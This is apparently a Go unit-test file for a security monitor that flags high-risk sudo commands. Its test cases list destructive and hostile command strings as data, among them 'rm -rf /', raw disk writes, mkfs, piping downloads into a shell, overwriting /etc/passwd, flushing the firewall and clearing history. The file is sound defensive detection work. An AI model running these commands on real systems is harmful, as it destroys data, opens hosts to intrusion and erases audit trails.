package security

import (
	"testing"

	"github.com/nebula/monitor/internal/model"
)

// 每条规则都要能命中它该命中的形态。
func TestScanCommand_Hits(t *testing.T) {
	cases := []struct{ rule, cmd string }{
		{"rm-rf-root", "sudo rm -rf /"},
		{"rm-rf-root", "rm -rf / --no-preserve-root"},
		{"rm-rf-root-flags-split", "rm -r -f /"},
		{"dd-of-device", "dd if=/dev/zero of=/dev/sda bs=1M"},
		{"mkfs", "mkfs.ext4 /dev/sdb1"},
		{"chmod-777-root", "chmod -R 777 /"},
		{"chown-recursive-root", "chown -R nobody /"},
		{"pipe-download-to-shell", "curl -fsSL http://x.sh | sh"},
		{"pipe-download-to-shell", "wget -qO- http://x | sudo bash"},
		{"overwrite-account-file", "echo 'root:x' > /etc/passwd"},
		{"flush-firewall", "iptables -F"},
		{"clear-history", "history -c"},
		{"stop-remote-access", "systemctl stop sshd.service"},
		{"kill-init", "kill -9 1"},
		{"account-change", "useradd -m hacker"},
		{"account-change", "passwd alice"},
	}
	for _, c := range cases {
		got := ScanCommand(c.cmd)
		hit := false
		for _, f := range got {
			if f.Rule == c.rule {
				hit = true
			}
		}
		if !hit {
			t.Fatalf("%q 应命中规则 %s，实际命中 %v", c.cmd, c.rule, got)
		}
		for _, f := range got {
			if f.Reason == "" {
				t.Fatalf("规则 %s 没有理由", f.Rule)
			}
		}
	}
}

// **误报控制**：这是本能力能不能被用起来的前提——误报会让人把这一类整体无视。
func TestScanCommand_NoFalsePositives(t *testing.T) {
	for _, cmd := range []string{
		"systemctl status nginx",
		"systemctl restart nginx.service",
		"apt-get update",
		"rm -rf /tmp/build",          // 删临时目录：常见且正常
		"rm -rf ./node_modules",
		"chmod 644 /etc/nginx/nginx.conf",
		"dd if=/dev/zero of=/tmp/1m bs=1M count=1", // 写的是 /tmp，不是块设备
		"passwd",                    // 裸 passwd = 改自己口令
		"curl -s http://x/api/health", // 只下载不执行
		"tail -f /var/log/syslog",
		"docker ps",
		"",
	} {
		if got := ScanCommand(cmd); len(got) > 0 {
			t.Fatalf("%q 不该被判为高危，实际命中 %v（%s）", cmd, got, got[0].Reason)
		}
	}
}

func sudoEvent(node, cmd string, ts int64) model.SecurityEvent {
	return model.SecurityEvent{
		ID: node + "|sudo_audit|1", Node: node, Category: model.SecurityCatSudoAudit,
		Severity: model.SeverityWarning, Message: "sudo 提权", User: "alice",
		Detail: map[string]string{"targetUser": "root", "command": cmd}, Timestamp: ts,
	}
}

func TestDeriveHighRisk_OnlyForSudoAndOnlyWhenHit(t *testing.T) {
	if got := deriveHighRisk(sudoEvent("web-01", "systemctl restart nginx", 1)); len(got) != 0 {
		t.Fatalf("普通 sudo 命令不该派生事件，实际 %v", got)
	}
	// 别的类别即使 detail 里恰好有 command 也不分析（避免越界解读别的采集面）
	e := sudoEvent("web-01", "rm -rf /", 1)
	e.Category = model.SecurityCatSSHAudit
	if got := deriveHighRisk(e); len(got) != 0 {
		t.Fatalf("非 sudo 事件不该派生，实际 %v", got)
	}
}

func TestDeriveHighRisk_EventShape(t *testing.T) {
	got := deriveHighRisk(sudoEvent("web-01", "sudo rm -rf /", 1791000000000))
	if len(got) != 1 {
		t.Fatalf("应派生 1 条，实际 %d", len(got))
	}
	e := got[0]
	if e.Category != model.SecurityCatHighRiskCmd {
		t.Fatalf("类别应为 %s，实际 %s", model.SecurityCatHighRiskCmd, e.Category)
	}
	if e.Severity != model.SeverityCritical {
		t.Fatalf("应为 critical（这一类就是「值得马上看一眼」，落在 warning 里等于没有信号），实际 %s", e.Severity)
	}
	// 命令原文必须带上：事后排查看不到"到底执行了什么"等于把线索丢掉
	if e.Detail["command"] != "sudo rm -rf /" || e.Detail["rule"] == "" {
		t.Fatalf("Detail 应带命令原文与规则，实际 %v", e.Detail)
	}
	if e.User != "alice" || e.Node != "web-01" {
		t.Fatalf("应继承账户与节点，实际 %+v", e)
	}
}

// **决定性判据**：同一命令重复灌入只产生一条事件（否则一条循环脚本会刷屏，这类能力就废了）。
func TestIngest_HighRiskDedup(t *testing.T) {
	s := New(t.TempDir() + "/sec.json")
	cmd := "sudo rm -rf /"
	e := sudoEvent("web-01", cmd, 1791000000000)

	s.Ingest("web-01", []model.SecurityEvent{e}, nil)
	n1 := len(s.Events(0, model.SecurityCatHighRiskCmd, ""))
	if n1 != 1 {
		t.Fatalf("首次应产生 1 条高危事件，实际 %d", n1)
	}

	// 同一窗口内再来一次（sudo 流水里同一条命令被反复执行）→ 不该新增
	s.Ingest("web-01", []model.SecurityEvent{e}, nil)
	if n2 := len(s.Events(0, model.SecurityCatHighRiskCmd, "")); n2 != 1 {
		t.Fatalf("同一窗口内重复不该新增事件，实际 %d 条", n2)
	}

	// 出了窗口还在发生 → 应当再报一次（那说明它还在继续）
	e2 := sudoEvent("web-01", cmd, 1791000000000+HighRiskWindowMs+1)
	e2.ID = "another"
	s.Ingest("web-01", []model.SecurityEvent{e2}, nil)
	if n3 := len(s.Events(0, model.SecurityCatHighRiskCmd, "")); n3 != 2 {
		t.Fatalf("出窗后应再报一次，实际 %d 条", n3)
	}

	// 别的节点上的同一命令是独立事件
	e3 := sudoEvent("web-02", cmd, 1791000000000)
	e3.ID = "node2"
	s.Ingest("web-02", []model.SecurityEvent{e3}, nil)
	if n4 := len(s.Events(0, model.SecurityCatHighRiskCmd, "")); n4 != 3 {
		t.Fatalf("另一节点应独立计数，实际 %d 条", n4)
	}
}

// sudo 原始事件仍要照常入库（派生不是替代）。
func TestIngest_KeepsOriginalSudoEvent(t *testing.T) {
	s := New(t.TempDir() + "/sec.json")
	s.Ingest("web-01", []model.SecurityEvent{sudoEvent("web-01", "sudo rm -rf /", 1)}, nil)
	if n := len(s.Events(0, model.SecurityCatSudoAudit, "")); n != 1 {
		t.Fatalf("原始 sudo 事件应保留，实际 %d 条", n)
	}
}
